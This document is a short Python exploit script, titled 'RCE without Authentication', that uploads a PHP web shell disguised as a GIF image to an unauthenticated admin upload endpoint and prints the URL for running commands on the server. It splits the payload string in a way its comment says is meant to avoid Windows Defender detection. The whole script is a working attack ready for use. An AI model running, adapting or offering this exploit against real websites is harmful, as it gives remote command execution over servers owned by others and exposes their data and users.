# RCE without Authentication

import requests, argparse, sys

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='URL Target', required=True)
args = parser.parse_args()

http_proxy = "http://127.0.0.1:8080"
proxyDict = {
            "http" : http_proxy
        }

def upload_shell(target):
    url = f"http://{target}/admin/upload_image.php"
    payload = "GIF89a;"
    payload += "<?php system($_GET" # mencegah windows defender :p
    payload += "['cmd']);?>"
    f = {
        'title':(None,'zero'),
        'image':('shell1.phar',payload,'image/gif')
    }
    r = requests.post(url, files=f, allow_redirects=False, proxies=proxyDict)
    if 'Success' in r.text:
        print('[+] Success Uploaded')
        print(f'Access shell here: http://{target}/images/shell1.phar?cmd=id')
    else:
        print('[-] Failed upload')
    
def main():
    try:
        target = args.target
    except IndexError:
        print("[i] Usage: python3 %s -t TARGET" % sys.argv[0])
        print("[i] ex: python3 %s -t 127.0.0.1:8000" % sys.argv[0])
    upload_shell(target)

if __name__ == "__main__":
    main()


